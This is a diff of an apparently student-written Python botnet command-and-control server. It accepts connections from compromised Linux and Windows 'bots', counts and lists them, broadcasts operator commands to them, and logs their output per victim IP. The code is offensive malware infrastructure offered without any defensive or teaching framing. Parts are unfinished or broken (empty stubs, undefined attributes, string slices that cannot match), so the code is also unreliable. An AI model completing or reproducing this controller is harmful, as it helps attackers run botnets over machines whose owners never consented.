@@ -12,7 +12,10 @@ try:
 	from time import sleep # Import sleep from time to halt execution of program when necessary.
 	from os import devnull, _exit # Import devnull from os to send stderr to devnull.
 	from sys import exit # Import exit from sys to quit program when specified.
-except ImportError:
+	from threading import Timer # Import Timer to create threads for our functions.
+	from queue import Queue # Import Queue to use queue data structure functions. 
+except ImportError as err:
+	print(f'Import error: {err}')
 	exit(1)
 	
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
@@ -21,6 +24,11 @@ except ImportError:
 
 PORT = 1337 # Port number to receve connection from.
 IP = "172.17.0.1" # IP address of your computer. Change this!
+NUM_OF_CONNECTIONS = 10 # Number of connections to accept.
+NUM_OF_THREADS = 2 # Number of threads that we will create.
+THREAD_IDs = [1, 2] # Thread identifiers.
+RESPONSE_SIZE = 10000 # Maximum number of bytes to accept from the output of command.
+COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
@@ -40,8 +48,9 @@ class BotnetCmdCtrl:
 		self.windows_connections = {} # Dict containing Windows machines IP addresses and corresponding socket object.
 		self.linux_connections = {} # Dict containing Linux machines IP addresses and corresponding socket object.
 		self.server_socket = None # Will store the socket object created for the server.
+		self.server_queue = Queue() # Will be used to perform next job in the queue.
 		
-	def create_server_socket(self):
+	def create_socket(self):
 		"""This function will create a single server socket will accept
 		incoming connections from bots.
 			Arguments:
@@ -49,22 +58,32 @@ class BotnetCmdCtrl:
 			Returns:
 				None
 		"""
-		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-			sock.bind((IP, PORT)) # Bind the IP and port to a network interface card.
-			sock.listen() # Listen for incoming connections, default is 10, increase for more connections.
-			conn, addr = sock.accept() # Accept incoming connections, store connection socket and client IP, Port
-			print(addr[0])
-			response = conn.recv(1024).decode('utf-8') # Decode initial response from connection as utf-8
-			while response:
-				if "Windows" in response: # Check if operating system of target is Windows.
-					self.windows_count += 1 # Increment number of Windows machine counter.
-					self.windows_connections[addr[1]] = conn # Create key, value pair of target IP and connection socket.
-				else: 
-					self.linux_count += 1 # Increment number of Linux machine counter.
-					self.linux_connections[addr[1]] = conn # Create key, value pair of target IP and connection socket.
+		self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.server_socket.bind((IP, PORT))
+		self.server_socket.listen(NUM_OF_CONNECTIONS)
 
-					self.server_socket = sock # Set the instance socket to the connection socket we establisehd with our client.
+	def accept_connections(self):
+		"""
+		"""
+		self.linux_connections.clear() # Delete all possibly active Linux connections.
+		self.windows_connections.clear() # Delete all possibly active Windows connections.
+		while True:
+			conn, addr = self.server_socket.accept()
+			conn.setblocking(1)
+			initial_response = conn.recv(COMMMAND_SIZE).decode('utf-8')
+			print(initial_response)
+			if 'Linux' in initial_response:
+				self.linux_count += 1
+				self.linux_connections[addr[0]] = conn
+			else:
+				self.windows_count += 1
+				self.windows_connections[addr[0]] = conn
+
+	def create_threads(self):
+		"""
+		"""
 		
+
 	def get_command(self):
 		"""This function gets a command from the user.
 			Arguments:
@@ -72,63 +91,111 @@ class BotnetCmdCtrl:
 			Returns:
 				The command that was provided by the user.
 		"""
-		command = input(GREEN + 'c&c$ ' + RESET) # Prompt user for command to send to entire botnet.
-		return command # Return command specified.
+		cmd = input(GREEN + 'cmd$ ' + RESET) # Prompt user for command to send to entire botnet.
+		while cmd != 'quit':
+			if cmd == 'list linux':
+				for ipaddr in self.linux_connections.keys():
+					print(ipaddr)
+			elif cmd == 'list windows':
+				for ipaddr in self.windows_connections.keys():
+					print(ipaddr)
+			elif cmd == 'count linux':
+				print(f'{self.linux_count} Linux targets.')
+			elif cmd == 'count windows':
+				print(f'{self.windows_count} Windows targets.')
+			elif cmd[:5] == 'linux':
+				resp_list = self.send_cmd_all_linux(cmd[5:])
+				print(resp_list)
+			elif cmd[:5] == 'windows':
+				resp_list = self.send_cmd_all_windows(cmd[5:])
+				self.write_response_output(resp_list)
+			elif cmd[:6] == 'tar-ip':
+				resp_list = self.send_cmd_specific(cmd[6:])
+				self.write_response_output(resp_list)
+			elif cmd == 'help':
+				self.help()
+			else:
+				print("Invalid command")
+				self.command_and_control()
 	
-	def send_cmd_all_linux(self):
+	def send_cmd_all_linux(self, cmd: str):
 		"""This function will send the command to all linux bots in the botnet.
 			Arguments:
-				None
+				cmd (str): Command to send to target/s.
 			Returns:
 				Will return the response generated by the executed command on the client machines operating on linux.
 		"""
-		command = self.get_command()
-		for ip, conn in self.linux_connections.items():
-			conn.sendall(command)
-			response = self.sock.recv(10000).decode('utf-8') # Store response received from executed command.
-			self.write_response_output(response, ip) # Write response to file.
+		response_list = []
+		for conn in self.linux_connections.values():
+			conn.sendall(cmd)
+			response = self.sock.recv(RESPONSE_SIZE).decode('utf-8') # Store response received from executed command.
+			response_list.append(response)
+		return response_list
 			
-	def send_cmd_all_windows(self):
+	def send_cmd_all_windows(self, cmd: str):
 		"""This function sends a command to all windows bots in the botnet.
-		Arguments:
-			None
-		 Returns:
-			None
+			Arguments:
+				cmd (str): Command to send to target/s.
+		 	Returns:
+				None
 		"""
-		command = self.get_command()
-		for ip, conn in self.windows_connections.items():
-			conn.sendall(command)
-		response = self.sock.recv(10000).decode('utf-8')
-		self.write_response_output(response, ip)
+		response_list = []
+		for conn in self.windows_connections.values():
+			conn.sendall(cmd)
+			response = self.conn.recv(RESPONSE_SIZE).decode('utf-8')
+			response_list.append(response)
+		return response_list
 	
-	def send_cmd_specific(self):
+	def send_cmd_specific(self, cmd: str):
 		"""This function will send a command to specific IP addresses.
-		Arguments:
-			None
-		Returns:
-			None
+			Arguments:
+				cmd (str): Command to send to target/s.
+			Returns:
+				None
 		"""
-		command = self.get_command()
+		pass
 
 	def write_response_output(self, response: str, ip_addr: str):
 		"""This function will write the response generated by each machine in the botnet 
 		to a folder called "bots". The bots folder will contain files called by
 		the IP addresses of each compromised machines.
-		 Arguments:
-			response (str): The executed command response.
-			ip_addr (str): The IP addresses of the current machine we are communicating with.
-		Returns:
-			None
+		 	Arguments:
+				response (str): The executed command response.
+				ip_addr (str): The IP addresses of the current machine we are communicating with.
+			Returns:
+				None
 		"""
 		with open("bots/" + ip_addr, 'a+') as botfile:
 			pass
-	
+			
+	def command_and_control(self):
+		"""
+		"""
+
+
+	def help():
+		"""This function will print a help menu.
+			Arguments:
+				None
+			Returns:
+				None
+		"""
+		print("""
+		Commands:
+		list linux ->
+		list windows ->
+		count linux ->
+		count windows ->
+		linux ->
+		windows ->
+		tar-ip ->
+		""")
+
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def main():
 	botnetObj = BotnetCmdCtrl() # Instantiating socket object.
-	botnetObj.create_server_socket() # Creating our C&C server using the socket module.
-	botnetObj.send_cmd_all_linux() # Send command to all linux machines.
+	botnetObj.command_and_control()
 
 if __name__ == '__main__':
 	try:
